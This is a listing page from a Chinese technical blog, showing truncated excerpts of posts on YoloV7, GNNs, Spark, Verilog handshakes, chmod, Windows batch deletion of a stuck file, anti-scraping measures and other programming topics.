Transition_Block是本网络的一个创新点，是一个过渡模块。通常的卷积网络中，过渡模块使用的是3x3卷积核的卷积+步长2x2的最大池化。而该模块具有两个分支：左侧分支为步长为2x2的最大池化+1x1卷积，右边分支为1x1卷积+卷积核3x3、步长2x2的卷积，两个分支在输出的时候进行堆叠。
2.FPN YoloV7的Backbone一共提取三个特征层，当输入为640x640x3时，三个特征层的尺寸分别为80x80x512，40x40x1024，20x20x1024。这三个特征会经过FPN进行加强特征提取，具体步骤如下：
①最下层的特征（即尺寸为20x20x1024的）会经过SPPCSPC进行特征提取得到P5，该结构可以提升YoloV7的感受野。
②P5经过1x1卷积调整通道+一次上采样后与一次卷积后的第二层特征(40x40x1024)进行结合(Concat)，然后利用一个Multi_Concat_Block进行特征提取，得到P4。
③P4同样经过一次1x1卷积调整通道+一次上采样后与一次卷积后的第一层特征(80x80x1024)进行特征融合，然后利用一个Multi_Concat_Block进行特征提取，得到P3。
④P3经过一次Transition_Block下采样后与P4堆叠，然后使用Multi_Concat_Block提取到P4_Out，尺寸为(40x40x256)
⑤P4_Out经过一次Transition_Block下采样后与P5堆叠，然后使用Multi_Concat_Block提取到P5_Out，尺寸为(20x20x512)
3.Yolo Head YoloV7是Yolo Head前使用了一个RepConv结构，即在训练时引入一个特经过特殊设计的残差结构，但实际预测时，该结构等效于一个3x3卷积，故不会导致预测性能的下降。
经过RepConv后，即可开始对结果进行解码。经过FPN我们可以得到三个输出，分别为(N,20,20,255),(N,40,40,255),(N,80,80,255)。其中N为通道数。每个输出的通道数255均可分解为3个85，对应这3个先验框的85个参数。
先验框的85个参数可以拆分为4+1+80，其中4代表每个特征点的回归参数，用以获得调整后的预测框，1用以判断特征点是否含有物体，80用以判断每个特征点所包含的物体种类。
大致的计算步骤可以分为以下几步：
①进行中心点预测，利用回归预测（前两位）的结果对中心点偏移进行计算
②进行预测框宽高预测，利用回归预测（后两位）的结果计算预测框的宽高
③将预测框绘制在图片上
同时还需要进行非极大抑制操作，防治同一类出现多个预测框
4.Loss部分 YoloV7的Loss包含三个部分：回归部分（Reg）、物体部分（Obj）、物体类别部分（Cls）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/550a59d086bc6a11afd14c7cd4d5b06b/" rel="bookmark">
			SuperMap iDesktopX 11i 扩展开发之自定义启动程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 背景2. 环境准备3. 新建项目3.1. 通过 SuperMap iDesktopX 扩展插件模板创建3.2. IDEA 新建 iDesktopX 扩展开发项目 4. 自定义启动界面5. 自定义启动后操作6. 修改启动方式7. 总结 1. 背景 SuperMap iDesktopX 是通过 SuperMap iObjects Java 核心库和 Java SE Development Kit（JDK）构建的一款企业级、插件式、跨平台桌面 GIS 应用与开发平台，可基于 Java 语言在 Windows 或 Linux 系统中进行扩展开发。
SuperMap iDesktopX 应用程序是基于插件机制构建的，各个功能通过加载相应功能的插件实现，界面配置是插件 + 配置文件的方式。目前主要包含 2 种扩展开发的方式：1. 自定义启动程序扩展；2. 功能插件扩展。
当程序启动时，后台需要一定的操作时间，在此期间，为了用户的更好体验，程序的启动界面可以友好的改善用户体验。本文主要介绍如何基于 SuperMap iDesktopX 自定义启动程序扩展开发。
2. 环境准备 基于 SuperMap iDesktopX 进行扩展开发，所需的环境依赖均由 iDesktopX 提供，因此开发环境仅需要 iDesktopX 和 IDEA 足以满足需求。
软件版本下载地址说明SuperMap iDesktopX11i 及其以上版本SuperMap iDesktopX 下载地址SuperMap iDesktopX 分别提供了安装包和精简绿色包 2 种，可根据实际项目需求下载合适的版本包IntelliJ IDEA2020.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/550a59d086bc6a11afd14c7cd4d5b06b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7235a6bdb63354956be623399e87fd83/" rel="bookmark">
			【深度优先搜索】经典例题：岛屿的最大面积 &#43; 岛屿数量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、题目二、深度优先搜索三、解法 一、题目 二、深度优先搜索 1、算法思想
深度优先搜索（depth-first seach，DFS）是一种用于解决图搜索问题的优先搜索/遍历算法。图搜索问题是在具有节点和边的图结构中寻找特定目标的问题，通常需要找到从起始节点到目标节点的路径或者确定是否存在这样的路径。基本的思路就是：从起始节点开始，沿着一条路径一直走到底，直到不能再走为止；然后回溯到上一个节点，再走其他可能的路径，直到所有的路径都遍历过为止。从上述思路可以知道：当遍历完一条路径以后需要回溯到上一个节点，而且通常需要返回一些值，因此DFS函数中需要使用先入后出的栈 或者 与栈等价的递归 实现。 2、算法模板
int/void/... dfs(输入：一般为初始节点) 1、记录该节点对应的值，具体题目具体分析； 2、一般会增加一个变量记录是否搜索过该节点； 3、开始进行遍历，可能会有不同的方向（通常单独建立一个变量表示搜索方向）： 搜索到下一个节点，判断该节点是否满足一定的条件（具体问题，具体分析）： 满足条件，则会调用dfs函数进行递归（注意递归一定要有边界条件，来结束递归） 4、返回结果：return 某个值 三、解法 1、岛屿的最大面积
1）整体思路：将网格中的每个节点作为初始节点（如果是陆地在进入dfs，否则没必要进入），以四个方向进行遍历实现深度优先搜索；
2）dfs函数输入为初始节点(x, y)，定义两个vector dx和dy表示四个方向，以及一个与grid同维度的g来表示每个节点是否已被搜索过；
3）dfs函数中：定义area表示该节点是否为陆地，是陆地为1，否则为0。然后记录该节点是否被搜索过，被搜索过变为0。开始遍历节点：如果该节点的位置在网格内，且值为1，则area += dfs(x, y)。
class Solution { public: int m, n; vector&lt;vector&lt;int&gt;&gt; g; vector&lt;int&gt; dx = {-1, 1, 0, 0}; vector&lt;int&gt; dy = {0, 0, -1, 1}; int dfs(int x, int y){ int area = 1; g[x][y] = 0; for (int k = 0; k &lt; 4; k++){ int a = x + dx[k]; int b = y + dy[k]; if (a &gt;= 0 &amp;&amp; a &lt; m &amp;&amp; b &gt;= 0 &amp;&amp; b &lt; n &amp;&amp; g[a][b]){ area += dfs(a, b); } } return area; } int maxAreaOfIsland(vector&lt;vector&lt;int&gt;&gt;&amp; grid) { m = grid.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7235a6bdb63354956be623399e87fd83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87edc1f3e10dca4ce16cc3fba3ddf955/" rel="bookmark">
			图神经网络系列(gnn)及其实现--小白系列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图神经网络（GNN）介绍
图神经网络（Graph Neural Network，简称GNN）是一类特殊的神经网络模型，被广泛用于处理具有图结构的数据。GNN通过学习节点之间的关系和局部结构来提取图数据中的特征，并在许多领域中取得了显著的成果。本文将介绍几种常见的GNN模型，包括GCN、SAGE、GAT、GATNE和Node2Vec，并对它们的算法原理、输入输出、代码实现以及优缺点进行详细讨论。
图卷积网络（GCN）
1.1 算法介绍
GCN是一种基于卷积操作的图神经网络模型，旨在学习节点的表示向量，使得节点的特征能够利用节点之间的连接关系得到更新。GCN模型的核心思想是将节点的邻居节点信息进行聚合，并利用卷积操作对聚合后的邻居信息进行整合。
1.2 输入输出 1.输入：图数据，包括节点特征矩阵和邻接矩阵。
2.输出：更新后的节点特征矩阵。
1.3 代码示例
import torch
import torch.nn as nn
import torch.nn.functional as F
class GCN(nn.Module):
def init(self, in_features, out_features):
super(GCN, self).init()
self.linear = nn.Linear(in_features, out_features)
def forward(self, x, adj): x = torch.matmul(adj, x) x = self.linear(x) x = F.relu(x) return x 1.4 优缺点
3.优点：GCN具有参数共享和局部连接性的优势，能够学习节点的局部结构信息，并具有较强的泛化能力。
4.缺点：GCN模型采用邻居聚合的方式，容易受到图中噪声节点的干扰，并且无法处理动态图。
图注意力网络（GAT）
2.1 算法介绍
GAT是一种基于注意力机制的图神经网络模型，通过学习节点之间的权重分配来动态地聚合邻居信息。GAT模型采用自注意力机制，使得每个节点可以根据邻居节点的重要性进行不同程度的聚合。
2.2 输入输出 5.输入：图数据，包括节点特征矩阵和邻接矩阵。
6.输出：更新后的节点特征矩阵。
2.3 代码示例
import torch
import torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87edc1f3e10dca4ce16cc3fba3ddf955/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/314ec8291286c346902a8779858ac7d0/" rel="bookmark">
			通过实体中@TableName(“test“)找到项目中所用的表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import cn.hutool.core.io.FileUtil; import cn.hutool.core.text.StrFormatter; import cn.hutool.core.text.StrJoiner; import java.io.File; import java.io.FileFilter; import java.nio.charset.Charset; import java.util.ArrayList; import java.util.List; public class Test { public static void main(String[] args) { String rootPath = "E:/work/test/src/main/java/com/bjs/ceshi/entity"; //实体类路径 List&lt;File&gt; files = FileUtil.loopFiles(FileUtil.file(rootPath), -1, new FileFilter() { @Override public boolean accept(File pathname) { return pathname.getName().endsWith("DO.java"); //实体类结尾名 } }); List&lt;String&gt; lines = new ArrayList&lt;&gt;(); files.forEach( file -&gt; { List&lt;String&gt; oriLines = FileUtil.readLines(file, Charset.forName("utf-8")); for (int i = 0; i &lt; oriLines.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/314ec8291286c346902a8779858ac7d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64524c01e28dacce22c9f0405c49a307/" rel="bookmark">
			握手信号valid/ready的打拍技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 valid和ready信号，尤其是ready信号的时序一般很差，因为它通常是接收端通过组合逻辑输出的。当流水线的级数较多时，ready反压信号一级一级往前传递，时序将会变得更差。 为了优化时序，通常需要对valid和ready信号进行打拍处理。但是由于握手信号的特点，使得这两个信号直接打拍时会发生协议错误，此时就需要使用一些技巧来解决这个问题。 通常对于握手信号的打拍处理有以下三种方式：
Forward Register Slice：仅处理valid和data信号的打拍Backward Register Slice：仅处理ready信号的打拍Full Register Slice：同时处理valid信号与ready信号的打拍 二、Forward Register Slice 传送门：valid-ready握手协议中valid及data信号的打拍技巧
module valid_flop ( CLK, RESET, VALID_UP, READY_UP, DATA_UP, VALID_DOWN, READY_DOWN, DATA_DOWN ); //----------------------------------------------------------------------------- parameter WIDTH = 32 ; //----------------------------------------------------------------------------- input CLK; input RESET; input VALID_UP; output READY_UP; input [WIDTH-1:0] DATA_UP; output VALID_DOWN; input READY_DOWN; output [WIDTH-1:0] DATA_DOWN ; //----------------------------------------------------------------------------- wire CLK; wire RESET; wire VALID_UP; wire READY_UP; wire [WIDTH-1:0] DATA_UP; //Down Stream reg VALID_DOWN; wire READY_DOWN; reg [WIDTH-1:0] DATA_DOWN; //----------------------------------------------------------------------------- //Valid always @(posedge CLK) if (RESET) VALID_DOWN &lt;= 1'b0; else VALID_DOWN &lt;= READY_UP ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64524c01e28dacce22c9f0405c49a307/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69dbc7c626762b555ad26d4cd4c3af27/" rel="bookmark">
			使用 python 导入 excel 数据绘图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import xlrd from pylab import * mpl.rcParams['font.sans-serif'] = ['SimHei'] # 添加这条可以让图形显示中文 x_axis_data = linspace(0, 0.9, 10) path = '缺失数据.xlsx' labels = ['BTD-GTAN', 'GTAN','STGCN','ASTGCN','DCRNN','DSANET','STSGCN'] colors=['red', 'orange', 'hotpink', 'blue', 'purple', 'black', 'green'] fmt=[".", "^", "v", "&lt;", "*", "&gt;", "s"] data_excel = xlrd.open_workbook(path) """ 获取所有sheet名称 """ sheet_names = data_excel.sheet_names() print(sheet_names) # 通过name获取第一个sheet对象 sheet1_object = data_excel.sheet_by_name(sheet_name="Sheet1") print(sheet1_object) # 结果：&lt;xlrd.sheet.Sheet object at 0x0000000002956710&gt; """ 获取所有或某个sheet对象 """ sheets_object = data_excel.sheets() print(sheets_object) """ 判断某个sheet 是否已导入""" sheet_is_load = data_excel.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69dbc7c626762b555ad26d4cd4c3af27/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aad99f0cbd8d803f8d827dd2733ca1e6/" rel="bookmark">
			如何防止爬虫,防止别人爬数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着互联网的发展，爬虫技术也越来越成熟。越来越多的网站和应用程序需要采取措施来保护自己不被恶意爬虫攻击。下面是一些常用的方法：
1. User-Agent 验证
User-Agent 是指浏览器或爬虫程序使用的标识符，通过验证 User-Agent 可以确认访问者的身份。网站可以通过检查 User-Agent 是否合法，如果不是，则可能是爬虫程序。可以通过服务器配置或者中间件代理进行验证,来拒绝不合法的访问。例如，可以通过检查 User-Agent 中是否包含爬虫程序的关键字来拒绝爬虫访问。
2. IP 地址验证
IP 地址是指访问者的网络地址，通过验证 IP 地址可以确认访问者的身份。网站可以通过检查 IP 地址是否合法，来拒绝不合法的访问。这是防止攻击和恶意爬虫的有效方法。例如，可以通过检查 IP 地址是否属于黑名单来拒绝黑名单中的 IP 访问。
3. 验证码
验证码是一种人机验证技术，通过要求访问者输入验证码来确认其身份。验证码可以有效防止爬虫攻击，因为大多数爬虫程序无法识别验证码。但是，验证码对用户体验有一定的影响，因为用户需要手动输入验证码。
4. 动态页面
动态页面是指通过 JavaScript 等技术动态生成页面内容的网页。由于爬虫程序一般无法执行 JavaScript，因此可以通过使用动态页面来防止爬虫攻击。但是，使用动态页面也会对网站的性能和可访问性产生影响。
5. 访问频率限制
访问频率限制是指限制访问者的访问频率，以防止恶意爬虫攻击。例如，可以对同一个 IP 地址的访问频率进行限制，如果访问频率过高，就拒绝访问。但是，访问频率限制也会对用户体验产生影响，因为用户可能需要等待一段时间才能再次访问。
6.传统技术：如 robots.txt 文件、设置cookie、隐藏URL等在防止爬虫攻击过程中也扮演了重要角色。
7.频率限制：限制同一IP或同一用户在一段时间内的访问频率，来防止被大量请求过载服务器。
总的来说，防止爬虫攻击需要综合使用多种技术和方法，以保护网站和应用程序的安全和稳定性。希望这些信息能够帮助您了解如何防止爬虫攻击。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ebb7e3d1a78593182dbed27e43a181f/" rel="bookmark">
			【大数据处理框架】Spark大数据处理框架，包括其底层原理、架构、编程模型、生态圈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Spark框架的底层原理Spark框架的架构Spark CoreSpark SQLSpark StreamingSpark MLlibSpark GraphX Spark框架采用的编程模型Spark生态圈 Spark大数据处理框架是一个开源的大数据处理框架，它可提供高效的内存计算，可在弹性、分布式的集群上运行。Spark框架的优势在于它能够更加高效地利用计算资源，提高数据处理速度，因此在大数据处理领域中广受欢迎。 Spark框架的底层原理 Spark框架的底层原理基于RDD（Resilient Distributed Datasets）模型，它是Spark的核心概念之一。RDD是一种抽象的数据结构，可以看作是一个分布式的数据集合。RDD中的元素可以分布在多个节点上，每个节点处理自己存储的部分数据，同时可以将部分数据缓存到内存中，以提高数据处理的效率。
RDD的特点是可分片（Partition）、可缓存（Cacheable）、可并行处理（Parallelizable）。其中，可分片是指RDD中的数据可以被分成多个不同的片段，每个片段可以独立处理；可缓存是指对于RDD的操作，可以将部分数据缓存到内存中，以提高处理效率；可并行处理是指RDD中的数据可以被多个节点并行处理，从而提高数据处理的速度和效率。
举个例子，如果我们有一个包含100万个整数的数据集，我们可以将它分成10个RDD分片，每个分片包含10万个整数。然后，我们可以将这10个分片分配给10个不同的节点来处理。每个节点可以并行处理它自己的分片，然后将处理结果发送给主节点进行聚合，最终得到整个数据集的处理结果。
为了保证分布式计算的可靠性，RDD采用了基于日志的数据恢复机制。当RDD中的某个分片出现故障时，可以根据日志信息进行数据恢复，保证数据的完整性和一致性。
总之，RDD是Spark框架中非常重要的概念之一，它提供了一种可靠、可分片、可缓存和可并行处理的数据结构，使得Spark能够高效地进行大规模的分布式计算任务。
现在我们来看一个故事来更深入理解RDD的概念。假设有一家大型电商公司，他们需要对所有顾客的购物记录进行数据分析，以了解客户的购买偏好和行为模式。这个数据集非常大，包含几百万条购物记录，无法在单台计算机上进行处理。
为了解决这个问题，该公司使用了Spark框架进行分布式计算。他们将购物记录分成小块，每个块包含1000条记录，然后将这些小块分配给不同的计算节点进行处理。每个节点都可以并行处理自己的数据块，然后将处理结果发送给主节点进行聚合，最终得到整个数据集的分析结果。
为了避免数据丢失和计算出错，RDD采用了数据分片和容错机制。数据分片使得数据可以被拆分成多个小块，并且可以在不同的节点上处理。容错机制则保证了在某个节点出现故障时，可以进行相应的数据恢复，保证数据的完整性和一致性。
通过这个故事，我们可以更深入地理解RDD的概念和作用。它是Spark框架中的核心概念之一，为分布式计算提供了可靠、高效和灵活的数据结构。
Spark框架的架构 主要包括了Spark Core、Spark SQL、Spark Streaming、Spark MLlib和Spark GraphX。
Spark Core Spark Core是Apache Spark中最重要的组件之一，也是整个Spark框架的核心。它提供了RDD（Resilient Distributed Datasets）数据结构和基本操作API，这是Spark在内存中高效处理大规模数据的基础。
RDD是Spark中的一种抽象概念，它是一组可以在多个节点上并行计算的不可变数据集合。RDD支持多种数据类型，包括数字、字符串、对象等。在Spark中，RDD是Spark应用程序的基础数据结构，所有的数据处理都是基于RDD进行的。
Spark Core提供了一系列基本操作API，包括Map、Reduce、Filter、Join等等。这些操作可以在RDD上进行，从而实现对数据的加工、转换和分析。此外，Spark Core还提供了一些高级操作API，如GroupByKey、ReduceByKey、Cogroup等等，可以方便地进行复杂的数据分析任务。
现在，让我们通过一个故事来更好地理解Spark Core的作用和意义。
假设我们有一个在线商城，需要对用户的购买历史数据进行分析，以了解用户的购买行为和兴趣，从而提供更好的推荐服务。
我们的数据集非常大，包括数十亿个购买记录，每条记录包括用户ID、商品ID、购买时间、购买数量等信息。如果使用传统的数据处理方法，如关系型数据库或文件存储，可能会遇到性能瓶颈和存储限制。
这时，我们可以使用Spark Core来处理这个数据集。首先，我们将购买记录分为小批次，每个批次包含数百万条记录。然后，我们将每个批次转换成一个RDD，并在RDD上使用基本操作API进行数据转换和加工。例如，我们可以使用Map操作将每个购买记录转换成一个元组（用户ID，商品ID），从而统计每个用户购买的商品列表。然后，我们可以使用ReduceByKey操作对每个用户购买的商品进行汇总，得到每个用户购买的商品数量和购买次数。最后，我们可以使用Filter操作筛选出购买次数最多的前N个商品，作为用户推荐的商品列表。
通过使用Spark Core，我们可以在内存中高效地处理大规模数据，加快数据分析的速度。同时，Spark Core还支持分布式计算，可以将数据分散到多个节点上进行并行计算，进一步提高计算效率和处理能力。
总之，Spark Core是Spark框架的核心组件，为数据处理和分析提供了强大的基础支持和高效的计算能力。
Spark SQL Spark SQL是Apache Spark生态系统中的一个模块，它提供了一种基于结构化数据的操作方式。Spark SQL支持使用SQL语言和DataFrame API进行操作，极大地简化了处理结构化数据的过程。
SQL是结构化查询语言的缩写，是一种用于管理和操作关系型数据库的语言。Spark SQL通过支持SQL查询，使得使用Spark进行数据处理的人员无需学习新的编程语言就能够快速地处理数据。而DataFrame API则提供了一种更加灵活、可扩展的方式来进行结构化数据操作。
例如，假设我们有一个包含销售数据的表格，其中包括销售日期、产品名称、销售数量、销售金额等字段。如果我们想要查询某一天销售额最高的商品名称，使用Spark SQL可以轻松地完成：
SELECT product_name FROM sales_data WHERE sales_date = '2021-01-01' ORDER BY sales_amount DESC LIMIT 1 上述查询语句中，我们使用SELECT语句指定了需要返回的数据字段，使用FROM语句指定要查询的数据表格，使用WHERE语句指定了过滤条件，使用ORDER BY语句指定了排序方式，最后使用LIMIT语句限制了返回结果的数量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ebb7e3d1a78593182dbed27e43a181f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a607df686e30bf362354df5d6427942/" rel="bookmark">
			【C语言】__attribute__使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux疑难问题排查实战，分享了作为公司专家，在项目开发过程中内存优化（堆、栈、代码段、数据段）、性能优化、死机（栈越界、堆越界）、死锁等疑难问题排查的案例、使用的工具（perf、asan、strace、memleak等）、工作经验，大家可以点开看一下，如果觉得有用可以关注一下，认真学习相信可以让你在日后工作中大放光彩。
一、介绍 GNU C 的一大特色就是__attribute__ 机制attribute 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。attribute 书写特征是：attribute 前后都有两个下划线，并切后面会紧跟一对原括弧，括弧里面是相应的__attribute__ 参数。 attribute 语法格式为：attribute ((attribute-list)) 关键字__attribute__ 也可以对结构体（struct ）或共用体（union ）进行属性设置。大致有六个参数值可以被设定，即：aligned, packed, transparent_union, unused, deprecated 和 may_alias 。在使用__attribute__ 参数时，你也可以在参数的前后都加上“__” （两个下划线），例如，使用__aligned__而不是aligned ，这样，你就可以在相应的头文件里使用它而不用关心头文件里是否有重名的宏定义。 二、使用：弱引用 C语言强、弱符号，强、弱引用
在公司项目开发的过程中，为了实现多平台兼容，增加代码的通用性，一般都是面向对象的设计思路；如果我们需要新增一个函数getTime，但是又不想影响到其他平台的使用，这个时候就需要弱引用。
弱引用：有强引用优先编译强引用，没有则编译器弱引用函数，避免编译出错
__attribute__ ((weak)) int32_t getTime（） { OSA_WARN(" is unsupported\n"); return -1; } 三、使用：section 提到section，就得说RO RI ZI了，在ARM编译器编译之后，代码被划分为不同的段，RO
Section(ReadOnly)中存放代码段和常量，RW Section(ReadWrite)中存放可读写静态变量和全局变量，ZI Section(ZeroInit)是存放在RW段中初始化为0的变量attribute((section(“section_name”)))，其作用是将作用的函数或数据放入指定名为"section_name"对应的段中。编译时为变量指定段名 const int descriptor[3] __attribute__ ((section ("descr"))) = { 1,2,3 }; long long rw[10] __attribute__ ((section ("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a607df686e30bf362354df5d6427942/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c00b6e18c59106e9c836ca2242ce6b11/" rel="bookmark">
			chmod修改权限命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		chmod修改权限命令 在linux系统中，进行命令键入开启文件或文件夹时，常会出现权限不够的报错信息，这里就需要chmod命令来修改权限了。
语法为chmod [-R] &lt;模式&gt; &lt;文件或目录&gt;
例如，chmod 777 file
其中，&lt;模式&gt; 是一个表示权限的三位数，每一位表示一种用户类型（所有者、群组、其他人）。每一位上的数值表示相应权限的开启情况，具体对应关系如下：
1：执行权限（x）2：写入权限（w）4：读取权限（r） 权限，要设置的权限，具体有以下几种：
0：无任何权限，即 —1：仅有x权限，即 –x2：仅有w权限，即 -w-3：有w和x权限，即 -wx4：仅有r权限，即 r–5：有r和x权限，即 r-x6：有r和w权限，即 rw-7：有全部权限，即 rwx 比如755，表示：rwxr-xr-x，表示将文件 file.txt 的权限设置为：所有者具有读、写和执行权限，群组和其他人只具有读和执行权限。
同时，7=4+2+1，即rwx 5=4+1，即r-x 而chmod -R 是一个用于递归修改文件权限的命令。在 Linux 和类 Unix 系统中，使用 -R 参数可以将权限更改应用于目录下的所有文件和子目录，包括目录本身。
语法：chmod -R &lt;模式&gt; &lt;目录&gt;
例如，chmod -R 777 file
其中，&lt;模式&gt; 表示要设置的权限，&lt;目录&gt; 表示要递归更改权限的目录。
使用 chmod -R 命令可以方便地同时修改目录及其下所有文件和子目录的权限，即设置文件夹和其内部全部内容一样生效，而无需手动逐个更改，非常便捷。
请注意，在操作过程中需要谨慎使用，确保不会对系统中的关键文件或目录设置错误的权限。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30c0551c9e7bf700ee5d378495a8315f/" rel="bookmark">
			在Chrome谷歌浏览器中执行JavaScript的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Chrome谷歌浏览器中如何执行JavaScript？在Chrome 浏览器中可以通过按下 F12 按钮或者右击页面，选择"检查"来开启开发者工具。
也可以在右上角菜单栏选择 "更多工具"=》"开发者工具" 来开启：
1、Console 窗口调试 JavaScript 代码 打开开发者工具后，我们可以在 Console 窗口调试 JavaScript代码，如下图：
上图中我们在 &gt; 符号后输入我们要执行的代码 console.log("runoob")，按回车后执行。
我们也可以在其他地方复制一段代码过来执行，比如复制以下代码到 Console 窗口，按回车执行：
console.log("runoob-1") console.log("runoob-2") 清空 Console 窗口到内容可以按以下按钮：
2、Chrome snippets 小脚本 我们也可以在 Chrome 浏览器中创建一个脚本来执行，在开发者工具中点击 Sources 面板，选择 Snippets 选项卡，在导航器中右击鼠标，然后选择 Create new snippet 来新建一个脚本文件：
如果你没看到 Snippets ，可以点下面板上到 &gt;&gt; 就能看到了。
点击 Create new snippet 后，会自动创建一个文件，你只需在右侧窗口输入以下代码，然后按 Command+S（Mac）或 Ctrl+S（Windows 和 Linux）保存更改即可。
console.log("runoob-1") console.log("runoob-2") 保存后，右击文件名，选择 "Run" 执行代码：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a62a75f6a23693d4501cf805d4176edf/" rel="bookmark">
			电脑桌面出现一个无法删除的空白文件应该怎样删除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们在下载或者配置系统的时候，我们会忽然发现我们的电脑桌面出现了一个不知名的空白文件，删除之后刷新电脑还是会重新出现怎么办？
方法一：我们先尝试删除此文件
方法二：当我们删除文件后，再次刷新桌面还是会出现一个新的空白文件。这时我们可以尝试利用批处理文件删除文件。
第一步：新建一个空白文档，并在空白文档内编辑如下内容：
DEL /F /A /Q \\?\%1
RD /S /Q \\?\%1
第二步：将txt文件更改为批处理文件
第三步：将无法删除的空白文件拖入新建的空白文件，批处理文件接收到文件就会执行删除命令
方法三：如果之前两种方法都不能删除空白文件，可能的原因是;最近下载软件或配置系统时出现的文件。将软件或系统卸载，重启一次电脑，空白文件就会被删除掉。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a801c13cadc3760ced9f8476e9549ba4/" rel="bookmark">
			企业级CDP数据工程实践（一）：建设中的最佳实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，许久未见，我是云祁～
今天想和大家分享下 企业级CDP项目 建设中的数据工程实践。
在很多情况下，大家可能会将数据工程与ETL的过程画上等号，但实际上ETL只是数据工程的一部分，其工作量通常仅占整个数据项目的 30% 左右。
而一个数据工程项目，本质上是要解决三大问题：
客户有什么？
客户想要什么？
怎样设计最合理？
因此，在数据工程项目中，数据现状梳理、业务理解 和 数据模型设计 等工作量通常占据了项目的大部分，约占百分之五六十。如果在这些关键阶段 没有深入了解情况、理解需求不充分 或 设计不合理，就可能导致开发返工，从而影响整个项目的交付进度。
CDP（Customer Data Platform）是一种面向营销的 客户数据管理平台，旨在采集、整合、分析和应用来自不同渠道和场景的实时和非实时客户数据。通过客户建模、设计营销活动、提高营销效率 和 优化客户体验，实现企业业绩和利润的增长。
CDP在功能上注重用户群体分析，包括 分群、标签画像 和 变化趋势等。
通过将多渠道、多场景的客户数据整合到一个平台中，为企业提供全面的客户视图和洞察。这使得企业能够更好地了解客户的行为、偏好和需求，从而精准地定位目标受众，并开展个性化的营销活动。
CDP的功能还包括 数据清洗、数据质量管理、数据安全 和 隐私保护等方面的支持，以确保数据的准确性、一致性 和 合规性。
通过CDP，企业能够建立长期的客户关系，并提供卓越的客户体验。
它为企业提供了一个集中管理和利用客户数据的平台，从而使营销团队能够更加智能地分析客户数据、制定营销策略，并实时监测和优化营销效果。
这些功能帮助企业实现更精准的营销投放、提升客户忠诚度，最终达到业绩和利润的增长。
“ CDP 与 CRM系统、DMP系统通常有很多关联，也有区别。CDP 是面向客户营销和运营场景，使用者以营销人员为主，营销活动包括新客获取，也包含老客运营。数据以企业的一方客户数据为主，一般包含 PII (Personal Identifiable Information，个人身份信息) 信息，也可包含其他来源数据。
CRM是面向记录和分析场景，使用者以销售和服务人员为主，管理内容是一方客户数据；DMP面向营销场景，使用者以营销人员为主。营销活动以拉新为主，系统一般会直接对接数字媒体，数据以二方或三方数据为主，一般不含PII信息。
CDP系统可以看作是 CRM 系统的功能延伸，一般会从 CRM 系统、DMP 系统中获取数据，可以相互集成。”
PS：一方数据是指企业自由的客户相关数据，即收集来源为客户自由渠道；二方数据是指媒体或者服务商来源的数据，如广告投放中的点击、曝光数据；三方数据是其他来源的数据。以上含义属于在数字化广告中常见提法。
CDP项目数据工程主要包括7个阶段，如下所示，在后面针对每个阶段的详细介绍中首先会给出每个阶段的输入和输出，再介绍每个阶段的工作内容和要点。
1） 数据调研 —— 业务系统和数据源梳理
2）业务理解 —— 标签体系及其计算口径梳理
3）集成设计 —— 数据集成接口及ODS层数据设计
4）数据设计 —— 数据模型设计
	</div>
	<div class="list__footer clearfix">
